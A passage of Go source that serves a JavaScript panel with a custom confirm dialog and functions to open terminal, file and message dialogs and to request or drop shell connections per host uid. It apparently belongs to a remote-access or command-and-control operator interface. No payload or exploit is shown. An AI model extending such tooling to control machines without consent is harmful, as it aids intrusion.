        okButton.textContent = "yes";
        okButton.style.width = "90px";
        okButton.style.padding = "8px";
        okButton.style.border = "none";
        okButton.style.borderRadius = "6px";
        okButton.style.background = "#2196f3";
        okButton.style.color = "#fff";
        okButton.style.cursor = "pointer";

        // 取消按钮
        let cancelButton = document.createElement("button");
        cancelButton.textContent = "no";
        cancelButton.style.width = "90px";
        cancelButton.style.padding = "8px";
        cancelButton.style.border = "none";
        cancelButton.style.borderRadius = "6px";
        cancelButton.style.background = "#ddd";
        cancelButton.style.color = "#333";
        cancelButton.style.cursor = "pointer";

        function close(result){
            document.body.removeChild(overlay);
            resolve(result);
        }
        okButton.onclick = () => {
            close(true);
        };

        cancelButton.onclick = () => {
            close(false);
        };

        buttonBox.appendChild(okButton);
        buttonBox.appendChild(cancelButton);

        confirmBox.appendChild(buttonBox);

        overlay.appendChild(confirmBox);
        document.body.appendChild(overlay);
        // 点击外部关闭
        overlay.onclick = function(e){
            if(e.target === overlay){
                close(false);
            }
        };

    });
}

window.lainIndex = new lain_index();
window.l_index = window.l_index || new index();
window.showTerminalDialog = function(uid, host, os) {
    // 这里要用你的类实例，比如
    if (window.lainIndex) {
        window.lainIndex.showTerminalDialog(uid, host, os);
    }
};
window.showFileDialog = function(uid, host) {
    if (window.lainIndex) {
        window.lainIndex.showFileDialog(uid, host);
    }
};
window.showMsgDialog = function(uid, host) {
    if (window.lainIndex) {
        window.lainIndex.showMsgDialog(uid, host);
    }
};
window.get_conn = async function(uid, shellname) {
    if (!window.l_index) {
        return false;
    }
    window.shell_list = Array.isArray(window.shell_list) ? window.shell_list : [];
    if (window.shell_list.includes(uid)) {
        const ms = await customConfirm("just a sec...");
        if (!ms) {
            return false;
        }
        setTimeout(async () => {
            const sentLater = await window.l_index.get(uid, shellname);
            if (sentLater) {
                customLog("Request sent");
            }
        }, 60000);
        return true;
    }
    const sent = await window.l_index.get(uid, shellname);
    if (!sent) {
        return false;
    }
    if (!window.shell_list.includes(uid)) {
        window.shell_list.push(uid);
    }
    return true;
};
window.del_conn = function(uid) {
    if (window.l_index) {
        return window.l_index.del(uid);
    }
    return false;
};
if (!window.fileDialogButtonBound) {
    document.addEventListener("click", function(event) {
        const button = event.target.closest(".file-open-btn");
        if (!button) {
            return;
        }
        const uid = button.dataset.uid || "";
        const host = button.dataset.host || "";
        const dir = button.dataset.dir || "./";
        if (window.lainIndex) {
            window.lainIndex.showFileDialog(uid, host, dir);
        }
    });
    window.fileDialogButtonBound = true;
}
`

			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprint(w, html)
			return
		}
	}
}
